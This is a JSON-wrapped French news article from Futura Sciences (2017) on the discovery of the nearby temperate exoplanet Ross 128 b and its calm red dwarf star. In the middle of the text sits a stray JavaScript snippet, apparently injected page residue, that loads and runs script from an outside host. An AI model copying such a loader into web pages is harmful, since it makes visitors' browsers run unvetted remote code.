{"title": "Découverte de Ross 128 b : cette planète proche peut-elle héberger la vie ?", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "16/11/2017", "content": "Une nouvelle exoterre vient d'être découverte dans notre voisinage galactique : Ross 128 b. Cette planète n'est qu'à 11 années-lumière de notre Système solaire. Présente dans la zone tempérée de son étoile, elle apparaît comme une bien meilleure candidate à l'habitabilité que Proxima b. Ce qu'il faut retenir Des astronomes ont confirmé l’existence d’une exoterre autour de Ross 128. Cette étoile est l'une des plus proches du Système solaire. Il s'agit d'une naine rouge qui semble calme, ce qui est une bonne nouvelle quant à l’habitabilité de la planète. Ross 128 b est 35 % plus massive que la Terre. Elle orbite dans la zone tempérée de son étoile, à seulement 7,4 millions de kilomètres. Quelle surprise ce fut d'apprendre, à la fin de l'été 2016, qu'une  planète rocheuse , Proxima b, comparable à la  Terre , gravite autour de  Proxima du Centaure , l' étoile  la plus proche de nous, distante de seulement 40.000 milliards de kilomètres (4,2  années-lumière ). À présent, une équipe internationale d'astronomes dirigée par Xavier Bonfils, de l'université de Grenoble, vient d'annoncer une autre découverte, tout aussi sensationnelle, si ce n'est plus : l'existence d'une  exoterre  autour de Ross 128, une autre étoile de notre voisinage galactique. Celle-ci n'est qu'à 11 années-lumière de notre  Système solaire . Ross 128 est une petite étoile d'environ 20 % de la taille de notre  Soleil  et 16 % de sa  masse  ; sa température de surface ne dépasse pas 3.000 °C. C'est une  naine rouge , la population d'étoiles la plus abondante au sein de la  Galaxie . Ces étoiles semblent fréquemment entourées de planètes rocheuses. Toutefois, les chercheurs s'inquiètent de leur tempérament : leurs sautes d'humeur répétées peuvent mettre en pièce les  atmosphères  des mondes qui leur tournent autour, surtout dans leurs zones habitables (comme ces étoiles sont plus froides, la zone tempérée est plus rapprochée que dans notre Système solaire). Zoom sur Ross 128, la douzième étoile la plus proche du Soleil, au sein de la constellation de la Vierge. © Nick Risinger, ESO,  Digitized Sky Survey 2 Ross 128, une étoile calme La bonne nouvelle avec Ross 128, c'est qu'elle semble tranquille, à la différence de Proxima ou Trappist-1... En 80 jours d'observation avec le satellite Kepler, les chercheurs n'ont en effet pas vu l'ombre d'une seule éruption... Tout y paraît plus calme, ce qui, naturellement, peut profiter à un monde situé dans la zone tempérée de son étoile. Deuxième exoterre la plus proche de nous, Ross 128 b est surtout  « la plus proche  exoplanète  tempérée autour d'une étoile calme » .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'exoplanète Ross 128 b a été détectée par la méthode de  vitesse  radiale grâce à la précision de l'instrument Harps ( High Accuracy Radial velocity Planet Searcher ), installé à l'observatoire de La Silla, au Chili. Il n'est malheureusement pas possible de voir l'exoterre passer devant son étoile, comme l'ont montré les observations avec Kepler. Pas de  transit . Ross 128 b se présente comme un monde dont la masse correspond à 1,35 fois celle de la Terre. Située à seulement 7,4 millions de kilomètres de son étoile (c'est 20 fois moins que la distance Terre-Soleil), la planète ne met que 9,9 jours pour boucler son  orbite . Pour l'instant, les chercheurs ne savent pas encore si elle est au centre de la zone habitable de la  naine rouge , ou plutôt sur le bord intérieur ou extérieur. Cela étant, l'équipe a estimé qu'elle reçoit 38 % de flux lumineux de plus que la Terre. Sa  « température d'équilibre varie entre 269 K pour un  albédo  ressemblant à celui de la Terre et 213 K pour un albédo de type Vénus » , écrivent les auteurs de l'étude à paraître dans la revue  Astronomy & Astrophysics . Selon des projections, Ross 128 (à ne pas confondre avec Ross 248) sera l’étoile la plus proche du Soleil dans 80.000 ans. © FrancescoA,  Wikimedia Commons,  DR                                De l'eau et une atmosphère sur Ross 128 b ? Si Ross 128 b possède une atmosphère — voire un  effet de serre  — et aussi de l'eau, il est donc possible d'imaginer que cette dernière puisse être à l'état  liquide . Avec l'avènement de nouvelles générations de  télescopes  géants comme le futur  EELT  et d'instruments toujours plus sensibles, les astronomes seront bientôt en mesure de détecter la présence éventuelle de biomarqueurs comme l' oxygène  dans le  spectre  des exoterres les plus proches. L'avantage avec Ross 128 est bien sûr sa proximité. Le saviez-vous ? Invisible à l’œil nu, l’étoile Ross 128, actuellement distante de 10,8 années-lumière de la Terre, en direction de la constellation de la Vierge, est la douzième étoile connue la plus proche de notre Système solaire. De par son mouvement dans la Galaxie, la naine rouge sera l’étoile la plus proche de nous dans environ 79.000 ans ! Un battement de cil à l’échelle du temps cosmique. Ross 128... Ce nom vous dit peut-être quelque chose. En mai dernier, en effet, l'annonce de la détection d'un  étrange signal radio  — baptisé  « Weird »  — provenant de la direction de cette étoile par le  radiotélescope  d'Arecibo avait fait sensation. L'énigme a-t-elle été résolue ? Il est possible que les signaux aient été émis par un ou plusieurs satellites terrestres. Mais l'affaire n'est pas complètement élucidée car certaines distorsions importantes du signal n'ont pas encore trouvé d'explications. Avec cette annonce, on peut imaginer que Ross 128 va faire l'objet de nouvelles écoutes. E-ELT : découvrez ce futur télescope géant comme si vous y étiez                       Voici le fascinant E-ELT (European Extremely Large Telescope). Dans cette vidéo publiée par l’ESO, nous découvrons ce télescope gigantesque, à la fois de l’extérieur et de l’intérieur. La première pierre de la structure a été posée. L’œil le plus puissant jamais pointé vers le ciel devrait entrer en service en 2024.                                       ", "theme": "sciences"}